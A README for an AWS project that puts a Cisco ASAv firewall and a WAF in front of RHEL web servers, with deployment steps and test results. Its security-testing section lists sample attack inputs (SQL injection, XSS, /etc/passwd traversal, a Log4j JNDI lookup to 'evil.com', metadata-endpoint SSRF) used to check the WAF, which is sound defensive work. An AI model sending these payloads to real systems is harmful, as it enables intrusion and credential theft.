# Cisco ASAv Firewall Infrastructure on AWS

Deploys a Cisco ASAv virtual firewall appliance on AWS that inspects all HTTP
traffic flowing to RHEL workload instances. The infrastructure is split across
two toolchains — **Terraform** for the VPC/workload baseline and **AWS CLI +
Ansible** for the firewall appliance — because the ASAv can take up to 30
minutes to boot, which would stall `terraform apply`.

Workload instances run plain RHEL 10.1 with httpd installed via user data.
Terraform automatically discovers the latest RHEL AMI — no Packer required.

## Architecture

```
Internet
   │
   ▼
┌──────────────────────────────────────────────────────────────────┐
│  AWS VPC  10.0.0.0/20                                            │
│                                                                  │
│  ┌─────────────────────────┐                                     │
│  │ Firewall Subnet         │  10.0.1.0/28                        │
│  │ ┌───────────────────┐   │                                     │
│  │ │ Cisco ASAv        │   │  Management EIP + VIP EIP           │
│  │ │ (c5.large)        │   │  Outside ENI: primary + secondary IP│
│  │ └──────┬────────────┘   │                                     │
│  └────────┼────────────────┘                                     │
│           │                                                      │
│  ┌────────▼────────────────┐                                     │
│  │ Inside ENI Subnet       │  10.0.2.0/28                        │
│  │ ASAv inside interface   │  Dedicated — no workload instances  │
│  │ Route: 0.0.0.0/0 → IGW  │                                     │
│  └────────┼────────────────┘                                     │
│           │  NAT'd traffic exits here                            │
│           ▼                                                      │
│  ┌─────────────────────────┐  ┌─────────────────────────┐        │
│  │ LB Subnet A             │  │ LB Subnet B             │        │
│  │ 10.0.3.0/27             │  │ 10.0.4.0/27             │        │
│  │ ALB ENIs + WAF           │  │ ALB ENIs + WAF           │        │
│  │ Route: 0.0.0.0/0 → IGW  │  │ Route: 0.0.0.0/0 → IGW  │        │
│  └────────┼────────────────┘  └─────────────────────────┘        │
│           │  ALB distributes to workload instances               │
│           ▼                                                      │
│  ┌─────────────────────────┐  ┌─────────────────────────┐        │
│  │ Workload Subnet A       │  │ Workload Subnet B       │        │
│  │ 10.0.5.0/26             │  │ 10.0.6.0/26             │        │
│  │ RHEL instances (httpd)  │  │ RHEL instances (httpd)  │        │
│  │ Route: 0.0.0.0/0 → FW   │  │ Route: 0.0.0.0/0 → FW   │        │
│  └─────────────────────────┘  └─────────────────────────┘        │
└──────────────────────────────────────────────────────────────────┘
```

Traffic flows top-to-bottom like a waterfall — each subnet has a single
purpose, CIDRs are sequential, and packets never revisit a subnet they
already passed through.

### Traffic flow (inbound HTTP via firewall VIP)

```
Client  ──►  IGW  ──►  Firewall outside ENI (VIP)
                            │
                       ASAv inspects, twice NAT:
                         src: client IP  → inside ENI IP
                         dst: VIP        → ALB private IP
                            │
                            ▼
                       Inside ENI subnet → VPC routes to ALB
                            │
                            ▼
                       ALB  ──►  RHEL instance (httpd, port 80)
                            │
                       Response: RHEL → ALB → inside ENI → ASAv
                       reverse NAT → outside ENI → IGW → Client
```

### Traffic flow (stress testing via ALB)

```
Client  ──►  ALB (round-robin, port 80)  ──►  WAF inspection  ──►  RHEL instance
```

Stress tests target the ALB directly. The WAF inspects every request at L7
before forwarding to the workload instances.

### Defense in depth

Two independent security layers inspect traffic at different OSI levels:

```
Internet → ASAv (L3/L4: ACLs, NAT, TCP inspection)
               → WAF (L7: SQLi, XSS, Log4j, SSRF, IP reputation)
                     → ALB (round-robin) → RHEL instances
```

- **ASAv** blocks port scans, SYN floods, crafted packets, and non-HTTP traffic
- **WAF** blocks application-layer attacks (SQL injection, XSS, path traversal, JNDI)
- Neither layer can see what the other inspects — true defense in depth

### Why the inside ENI has its own subnet

In v3, the inside ENI shared the workload subnet. This meant the firewall's
inside IP and the workload instances were in the same address space — packets
zigzagged within the same subnet. A dedicated /28 subnet for the inside ENI
gives clean separation: the firewall's traffic path and the workload instances'
traffic path are isolated at the subnet level.

### Why the ALB has its own subnets

The ALB cannot share subnets with the workload when the workload route table
points to the firewall. The ALB's return traffic would route through the
firewall (which never saw the inbound connection), causing asymmetric routing
drops. Dedicated LB subnets with their own IGW route table ensure the ALB
always has a direct internet path.

### Why the firewall uses a VIP (secondary IP)

The ASAv treats traffic to its own interface IP as "self-addressed"
(management-plane), bypassing NAT. A secondary private IP on the outside ENI
serves as a Virtual IP that the twice NAT rule processes and forwards to the ALB.

## Subnet layout

Subnets are ordered sequentially to match the traffic flow:

- **10.0.1.0/28** — Firewall (outside ENI) — traffic enters here
- **10.0.2.0/28** — Inside ENI — NAT'd traffic exits the firewall here
- **10.0.3.0/27** — LB Subnet A — ALB + WAF
- **10.0.4.0/27** — LB Subnet B — ALB + WAF
- **10.0.5.0/26** — Workload A — RHEL instances
- **10.0.6.0/26** — Workload B — RHEL instances

## Route tables

Three route tables control how traffic flows between subnets. The key distinction
is that the workload subnets route through the firewall while everything else
routes directly to the internet gateway.

**Firewall Route Table**
- Associated with: Firewall subnet (10.0.1.0/28)
- Routes:
  - `10.0.0.0/20` → `local` (intra-VPC)
  - `0.0.0.0/0` → `igw-xxx` (Internet Gateway)
- The ASAv's outside interface needs direct internet access for outbound NAT'd
  traffic to reach the internet and for inbound connections to arrive from the IGW.

**ALB Route Table**
- Associated with: LB Subnet A (10.0.3.0/27), LB Subnet B (10.0.4.0/27),
  Inside ENI Subnet (10.0.2.0/28)
- Routes:
  - `10.0.0.0/20` → `local` (intra-VPC)
  - `0.0.0.0/0` → `igw-xxx` (Internet Gateway)
- The ALB needs direct internet access for client-facing traffic.
- The inside ENI subnet shares this route table to avoid a routing loop — if it
  routed through the firewall, NAT'd packets exiting the inside interface would
  loop back into the firewall instead of reaching the ALB.

**Workload Route Table**
- Associated with: Workload Subnet A (10.0.5.0/26), Workload Subnet B (10.0.6.0/26)
- Routes:
  - `10.0.0.0/20` → `local` (intra-VPC)
  - `0.0.0.0/0` → `eni-xxx` (ASAv inside ENI — TenGigabitEthernet0/0)
- All outbound traffic from workload instances is routed through the ASAv's
  inside interface for inspection and NAT.
- Terraform deploys the default route as `0.0.0.0/0 → igw-xxx` as a safe default.
  After the ASAv is deployed and configured, `update_routes.sh` replaces it
  with `0.0.0.0/0 → eni-xxx` (firewall inside ENI).
- **Important**: `terraform apply` resets the route to IGW. Always re-run
  `update_routes.sh` after applying Terraform changes.

All three route tables include the implicit VPC local route (`10.0.0.0/20 → local`)
for intra-VPC traffic, which takes precedence over the default route. This is why
NLB health checks (intra-VPC) work even when the workload route table points to
the firewall.

## Project structure

```
CiscoFirewall/
├── main.tf                        # Root module — calls modules/aws
├── variables.tf                   # Root variables
├── outputs.tf                     # Root outputs (ALB DNS name)
├── terraform.tfvars               # Variable values (region, CIDRs)
├── provider.tf                    # AWS provider config
├── modules/aws/
│   ├── main.tf                    # VPC, subnets (workload, firewall, LB, inside ENI)
│   ├── workload.tf                # AMI lookup, launch template, ASG, ALB, WAF, scaling
│   ├── firewall.tf                # Firewall SG, route tables and associations
│   ├── variables.tf               # Module variables
│   ├── outputs.tf                 # Module outputs
│   ├── scripts/
│   │   └── user_data.sh           # Installs httpd and serves Hello World
│   └── json/
│       └── workload_assume_role.json  # IAM assume-role policy for SSM
├── scripts/
│   ├── deploy_asav.sh             # Deploy ASAv via AWS CLI
│   ├── update_routes.sh           # Point workload routes to firewall (or rollback)
│   ├── stress_test.py             # Python stress test (cycles: stress → rest)
│   ├── defaults.json              # Stress test config (URL, workers, durations)
│   ├── asav_deploy_output.env     # Deployment details (auto-populated)
│   └── go/                        # Go stress test (higher throughput)
│       ├── main.go
│       └── go.mod
├── ansible/
│   ├── inventory.ini              # ASAv SSH inventory
│   ├── configure_asav.yml         # Full ASAv config playbook
│   └── ansible.cfg                # Ansible settings
└── cisco-asav-key.pem             # EC2 key pair for ASAv SSH (not committed)
```

## Prerequisites

- AWS CLI v2 with credentials configured
- Terraform >= 1.0
- Python 3.10+ (for the stress test script)
- Ansible + `cisco.asa` collection: `ansible-galaxy collection install cisco.asa`
- `paramiko` Python package: `pip install paramiko`
- Cisco ASAv PAYG marketplace subscription active (product ID `87868dac`)
- EC2 key pair imported into your target region

## Deployment

### Step 1 — Terraform (VPC, ASG, ALB, WAF)

```bash
terraform init
terraform apply
```

Creates the VPC, 6 subnets, IGW, route tables, RHEL workload ASG (2–6 × t3.micro),
ALB with WAF WebACL, IAM role, and the firewall security group.
Terraform auto-discovers the latest RHEL 10.1 AMI. Workload instances launch
without public IPs — all internet access routes through the ASAv's NAT.

### Step 2 — AWS CLI (Cisco ASAv firewall)

```bash
# Set REGION and KEY_NAME in the script first
./scripts/deploy_asav.sh
```

Deploys the ASAv (c5.large) in the firewall subnet, disables source/dest check,
allocates a management EIP, and saves all IDs to `scripts/asav_deploy_output.env`.

### Step 3 — Attach inside ENI

Create the inside ENI in the **dedicated inside ENI subnet** (not the workload subnet):

```bash
INSIDE_ENI=$(aws ec2 create-network-interface \
  --subnet-id <inside_eni_subnet_id> \
  --groups <firewall_sg_id> \
  --description "ASAv Inside ENI (TenGigabitEthernet0/0)" \
  --query 'NetworkInterface.NetworkInterfaceId' --output text)

aws ec2 modify-network-interface-attribute \
  --network-interface-id $INSIDE_ENI --no-source-dest-check

aws ec2 attach-network-interface \
  --network-interface-id $INSIDE_ENI \
  --instance-id <asav_instance_id> --device-index 1
```

Reboot the ASAv to detect the new ENI.

### Step 4 — Configure the VIP for inbound HTTP

```bash
aws ec2 assign-private-ip-addresses \
  --network-interface-id <outside_eni_id> \
  --secondary-private-ip-address-count 1

VIP_ALLOC=$(aws ec2 allocate-address --domain vpc --query AllocationId --output text)
aws ec2 associate-address \
  --allocation-id $VIP_ALLOC \
  --network-interface-id <outside_eni_id> \
  --private-ip-address <secondary_private_ip>
```

### Step 5 — Ansible (firewall configuration)

```bash
# Set ASAv EIP, key path, alb_server_ip, and firewall_vip first
ansible-playbook -i ansible/inventory.ini ansible/configure_asav.yml
```

Configures interfaces, ACLs, PAT, twice NAT (VIP → ALB), static routes to
workload and ALB subnets via the inside ENI gateway, ICMP inspection, and logging.

### Step 6 — Route workload traffic through the firewall

```bash
./scripts/update_routes.sh            # workload → firewall
./scripts/update_routes.sh --rollback # workload → IGW (revert)
```

**Note**: `terraform apply` reverts routes to IGW. Re-run after each apply.

## Stress testing

Two stress test implementations are available:

```bash
# Go (recommended — higher throughput with goroutines)
scripts/go/stress_test

# Python
python3 scripts/stress_test.py
```

Both read `scripts/defaults.json` for URL, workers, and timing. The stress test
targets the ALB directly, which distributes load across workload instances.

### Auto-scaling behavior

Step scaling policy with two thresholds (tuned for t3.micro 10% baseline CPU):
- **20% ≤ CPU < 35%** → add 2 instances (2 → 4)
- **CPU ≥ 35%** → add 4 instances (2 → 6, caps at max)
- **CPU < 10%** → remove 1 instance (gradual scale-in)

ASG limits: min 2, desired 4, max 6 instances.

### Observed results (v5)

With 1,000 workers, continuous stress, Go stress test:
- **462,600 requests**, **77.8% success rate** (359,684 ok)
- Peak throughput: **1,122 req/s** (stabilized to ~830 req/s after burst credits)
- ASG scaled **2 → 4 → 6** (reached maximum capacity)
- Errors concentrated in first ~5 minutes before scaling caught up
- Latency: avg 1,211ms, p50 1,008ms, p95 2,661ms

The throughput curve shows t3.micro burst credit behavior: ~1,100 req/s during
burst, declining to ~830 req/s at 10% baseline. The step scaling policy triggers
fast enough to add capacity before instances become unresponsive.

## Security testing

### Firewall testing (packet-tracer)

The ASAv's built-in `packet-tracer` command simulates traffic through the full
inspection pipeline without sending real packets:

```
packet-tracer input outside tcp 8.8.8.8 12345 <vip_private_ip> 22    # SSH → DROP
packet-tracer input outside tcp 8.8.8.8 12345 <vip_private_ip> 3389  # RDP → DROP
packet-tracer input outside udp 8.8.8.8 12345 <vip_private_ip> 53    # DNS → DROP
packet-tracer input outside tcp 8.8.8.8 12345 <vip_private_ip> 80    # HTTP → ALLOW
```

### WAF malicious traffic simulation

Curl-based simulation testing all four WAF rule groups against the ALB:

**Blocked (HTTP 403) — 14/18 malicious requests:**
- SQL injection: `OR 1=1`, `UNION SELECT`, SQLi in POST body, SQLi in Cookie
- XSS: `<script>alert('xss')</script>`, `<img onerror=alert(1)>` in query params
- Path traversal: `../../../etc/passwd`, double-encoded `%252f` traversal
- Log4j/JNDI: `${jndi:ldap://evil.com}` in headers, User-Agent, obfuscated variants
- SSRF: AWS metadata endpoint (`169.254.169.254`), hex-encoded IP
- Oversized body (>8KB)

**Allowed (HTTP 200) — 4/18 edge cases:**
- XSS in User-Agent header, Windows backslash traversal, PHP RFI in query param,
  command injection in X-Forwarded-For

**Legitimate requests: both passed (HTTP 200)**

The WAF also caught **real internet scanning** during the test window:
`/xmlrpc.php`, `/wp-cro.php`, `/alfa-priv.php`, `/options.php` — WordPress
and web shell probes from automated scanners.

### ASAv threat detection (real internet traffic)

Cumulative drops from the ASAv over the deployment period:
- **6,137 ACL drops** — port scans and probes on non-permitted ports
- **929 TCP 3WHS failures** — SYN flood / half-open scan attempts
- **286 invalid TCP SEQ** — crafted packet attacks
- **3,171 NAT no-xlate** — probing unmapped ports on the firewall's public IP
- **56 TCP not-SYN** — stealth port scanning (ACK/FIN scans)
- **16 failed SSH logins** from 112.118.57.75 (Hong Kong) — brute-force attempt
- **2 inspection failures** — malformed traffic failing deep packet inspection

## Key design decisions

1. **Plain RHEL + httpd + PHP** — No Packer, no containers. User data installs
   httpd and PHP, serves a CPU-intensive endpoint (`/cpu.php`) for realistic
   ASG scaling. The project's focus is the firewall architecture.

2. **Dedicated inside ENI subnet** — The inside ENI gets its own /28 subnet
   (10.0.2.0/28), separate from the workload subnets. This creates a clean
   top-to-bottom "waterfall" traffic flow where packets move sequentially
   through subnets without revisiting any.

3. **Sequential CIDR layout** — Subnets are numbered 1→6 matching the traffic
   flow: firewall → inside ENI → LB → workload. Makes the architecture
   intuitive to read from a route table.

4. **WAF for defense in depth** — AWS WAF WebACL on the ALB with four managed
   rule groups (Common, SQLi, Known Bad Inputs, IP Reputation). Combined with
   the ASAv's L3/L4 inspection, this provides dual-layer security.

5. **Step scaling over target tracking** — Two-step policy tuned for t3.micro
   baseline CPU (10%). Triggers at 20% and 35% for predictable 2→4→6 scaling.

6. **No public IPs on workload instances** — All internet access routes through
   the ASAv's NAT. Instances are only reachable via the ALB (intra-VPC).

7. **Terraform + AWS CLI split** — The ASAv takes up to 30 minutes to boot.
   Keeping it outside Terraform avoids blocking `terraform apply`.

8. **VIP + Twice NAT** — Secondary IP on outside ENI avoids self-addressed NAT
   bypass. Both source and destination are translated for symmetric return traffic.

## Lessons learned

- **Route table must point to the inside ENI, not outside** — The workload
  route table must target the ASAv's inside interface (TenGigabitEthernet0/0)
  so traffic enters the trusted zone. Routing to the outside ENI causes the
  ASAv to treat workload traffic as untrusted, bypassing inside→outside NAT.
- **RHEL firewalld blocks port 80 by default** — User data must include
  `firewall-cmd --permanent --add-service=http` or httpd is unreachable even
  with correct AWS security groups.
- **Static HTML doesn't generate CPU load** — Serving a static page uses
  negligible CPU even under thousands of concurrent connections. A CPU-intensive
  endpoint (PHP with SHA-256 hashing) is needed to trigger CPU-based scaling.
- **t3.micro burst credits affect scaling behavior** — After credits exhaust,
  CPU caps at 10% baseline. Step scaling thresholds must be tuned below the
  burst ceiling (20%/35%) rather than typical production values (60%/80%).
- **`terraform apply` resets workload routes** — The workload route table in
  Terraform points to IGW. Every apply reverts the firewall route. Always
  re-run `update_routes.sh` after `terraform apply`. Critical when instances
  have no public IPs.
- **Subnet ordering matters** — Sequential CIDRs matching the traffic flow
  make the architecture self-documenting and easier to troubleshoot.
- **Every subnet needs a route table** — The inside ENI subnet needs the ALB
  route table (IGW access) to avoid a routing loop.
- **ASAv requires Nitro instances** — c5/m5 families with ENA drivers.
  Interfaces appear as `TenGigabitEthernet`, not `GigabitEthernet`.
- **Inside ENI and firewall must share the same AZ** — AWS doesn't allow
  cross-AZ ENI attachment.

## Cleanup

```bash
# 1. Rollback routes
./scripts/update_routes.sh --rollback

# 2. Terminate ASAv and release EIPs
aws ec2 terminate-instances --instance-ids <asav_instance_id>
aws ec2 wait instance-terminated --instance-ids <asav_instance_id>
aws ec2 release-address --allocation-id <mgmt_eip_alloc>
aws ec2 release-address --allocation-id <vip_eip_alloc>
aws ec2 delete-network-interface --network-interface-id <inside_eni_id>

# 3. Destroy Terraform infrastructure
terraform destroy
```
